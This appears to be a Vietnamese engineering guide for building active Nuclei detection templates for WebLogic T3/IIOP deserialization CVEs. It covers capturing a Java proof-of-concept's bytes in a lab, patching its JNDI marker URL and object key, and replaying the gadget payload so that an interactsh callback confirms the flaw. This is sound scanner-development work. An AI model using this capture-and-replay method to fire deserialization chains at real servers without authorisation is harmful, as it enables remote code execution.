# Pipeline: Nuclei Active OAST Template cho WebLogic T3/IIOP CVE

## 1. Tổng quan

Quy trình capture-replay: chạy Java PoC thật trên lab, bắt raw bytes qua LD_PRELOAD shim, rồi replay trong Nuclei JavaScript template với interactsh URL thay thế.

## 2. Chuẩn bị lab

- **wls12214**: `container-registry.oracle.com/middleware/weblogic:12.2.1.4` (JDK 8, port 7001)
- **wls1411**: `container-registry.oracle.com/middleware/weblogic:14.1.1.0-dev-11` (JDK 11, port 7101→7001)
- Cả hai container cần mount thư mục PoC và sockdump vào `/tmp/`

## 3. Build sockdump shim

```c
// sockdump.c — hook read/write/send/recv, ghi ra cap_r_<fd>.bin / cap_w_<fd>.bin
// Compile trong container:
gcc -shared -fPIC -o /tmp/sockdump.so /tmp/sockdump.c -ldl
```

Shim này hook libc I/O, ghi mỗi fd ra file riêng. Dùng thay vì tcpdump/strace vì container drop `NET_RAW` và không có sẵn debug tools.

## 4. Build Java PoC

Yêu cầu chung:
- **Gadget chain** kết thúc bằng JNDI lookup (JdbcRowSetImpl, JtaTransactionManager, InitialContext.lookup...)
- **Delivery**: IIOP `rebind_any` (server-side deser, scanner-friendly) hoặc T3 `bind`/`rebind`
- **Marker URL**: dùng URL cố định **96 bytes** (pad bằng `a`), ví dụ:
  ```
  rmi://marker2555v12.exm:18099/aaaaaaaaaaaaa...  (= 96 bytes)
  ```
  96 bytes fixed-width giúp thay thế bằng interactsh URL mà không cần recalc CDR/Java serialization length fields.
- **permit.jar** (Permit library): bypass JDK reflection warnings khi build proxy objects

```bash
# Trong container
cd /tmp/poc && javac -cp ".:permit.jar:/u01/oracle/wlserver/modules/*" CVE_xxxx_IIOP.java
```

## 5. Capture bytes

```bash
# Chạy PoC với sockdump
docker exec wls12214 bash -c \
  "cd /tmp/poc && LD_PRELOAD=/tmp/sockdump.so java -cp '.:permit.jar:/u01/oracle/wlserver/modules/*' CVE_xxxx_IIOP 127.0.0.1 7001 'rmi://marker...(96 bytes)'"
```

Sau khi chạy xong:
- `cap_w_<fd>.bin` = client-to-server (c2s) — đây là bytes cần replay
- `cap_r_<fd>.bin` = server-to-client (s2c) — dùng để debug
- Xác định đúng fd bằng cách check file có chứa `GIOP` header (IIOP) hoặc `t3 12.2.1` (T3)

```bash
# Copy capture ra host
docker cp wls12214:/tmp/poc/cap_w_650.bin ./iiop_xxxx/c2s_12.bin
```

## 6. Phân tích capture

```python
# Tìm marker URL trong c2s bytes
data = open("c2s_12.bin","rb").read()
idx = data.find(b"rmi://marker")
print(f"Marker at offset {idx}, length {len(data[idx:idx+96])}")
```

```python
# Tìm OBJECT_KEY (8 bytes sau BEA header)
# BEA flag: 0x42 0x45 0x41 0x2c (12.x) hoặc 0x2e (14.x)
# Key nằm ở offset +16 sau BEA header, 8 bytes
```

Cấu trúc GIOP frames trong capture (IIOP flow):
1. `LocateRequest` — gửi "NameService" để lấy OBJECT_KEY
2. `Request` (opcode `_non_existent`) — bind context
3. `Request` (opcode `_non_existent`) — resolve context  
4. `Request` (opcode `rebind_any`) — chứa serialized gadget + marker URL

Template chỉ cần gửi frame 1 riêng (để parse reply lấy key), rồi gửi frames 2-4 gộp lại (đã patch key + URL).

## 7. Viết Nuclei template

Cấu trúc template JavaScript:

```yaml
javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      // 1. T3 HELO probe — xác định version
      probe.SendHex("<t3 handshake hex>");
      let ver = helo.slice(5, 7);  // "12" hoặc "14"
      
      // 2. Version gate — skip nếu không affected
      if (!(ver === "12" || ver === "10")) { return; }
      
      // 3. GIOP LocateRequest — lấy fresh OBJECT_KEY
      c.SendHex("<LocateRequest hex>");
      // Parse reply: tìm BEA header → extract 8-byte key
      
      // 4. Patch capture bytes
      //    a. Thay OLD_KEY bằng new key (tất cả occurrences)
      //    b. Thay BEA flag 0x2c → 0x2e nếu server là 14.x
      //    c. Thay marker URL bằng interactsh URL (giữ 96 bytes)
      
      // 5. Gửi patched bytes
      c.SendHex(rest_hex);
      c.RecvFull(1000000);  // giữ socket mở để server hoàn thành JNDI lookup
```

### 7.1. OBJECT_KEY extraction

Hai phương pháp (heuristic walker + fallback BEA scan):

```javascript
// Primary: offset walker từ 0x60
let ioff = 0x60;
while (ioff < raw.length && raw[ioff] !== 0x00) ioff++;
while (ioff < raw.length && raw[ioff] === 0x00) ioff++;
let foff = 0x60 + (ioff - 0x60 + 1) + 0x75;
// key = raw[foff..foff+8]

// Fallback: scan BEA header
for (let i = 0x40; i + 24 <= raw.length; i++) {
  if (raw[i]===0x42 && raw[i+1]===0x45 && raw[i+2]===0x41 &&
      (raw[i+3]===0x2c || raw[i+3]===0x2e)) {
    key = raw.slice(i+16, i+24);
  }
}
```

## 8. Sign & test

```bash
# Sign template (nuclei yêu cầu cho javascript: protocol)
printf '\n\n' | nuclei -sign -t CVE-xxxx-active-oast.yaml

# Test trên 12.2.1.4
nuclei -t CVE-xxxx-active-oast.yaml -u host.docker.internal:7001 \
  -interactions-cooldown-period 15 -v

# Test trên 14.1.1
nuclei -t CVE-xxxx-active-oast.yaml -u host.docker.internal:7101 \
  -interactions-cooldown-period 15 -v
```

Kết quả mong đợi: `[CVE-xxxx] [javascript] [critical]` với interactsh DNS callback.

## 9. Checklist version coverage

| Điều kiện | Hành động |
|-----------|-----------|
| Chain dùng ReflectionExtractor | 12.x only (blacklisted trên 14.1.1 từ April 2020 CPU) |
| Chain dùng UniversalExtractor / JdbcRowSetImpl | 12.x + 14.1.1 (JDK 11 module encapsulation không block ObjectInputStream) |
| Chain dùng ExternalizableHelper bypass | 12.x + 14.1.1 (bypass IIOP class filter) |
| Chain dùng class từ eclipselink/optional module | Kiểm tra class có trong container base image không |

## 10. Lưu ý quan trọng

- **96-byte marker**: tất cả URL trong capture phải cùng độ dài cố định, tránh thay đổi length fields trong Java serialization / CDR encoding
- **RecvFull sau khi gửi**: bắt buộc — nếu close socket sớm, server chưa kịp hoàn thành JNDI lookup
- **CORBA MARSHAL error**: bình thường — server trả error SAU KHI chain đã fire (JNDI callback là side-effect)
- **Single-capture vs dual-capture**: nếu serialVersionUID và field layout giống nhau giữa 12.x và 14.x thì dùng single capture + patch BEA flag. Nếu khác (ví dụ TRMI hash) thì cần capture riêng cho mỗi version
- **host.docker.internal**: dùng thay vì 172.17.0.1 cho callback URL khi test từ host vào container
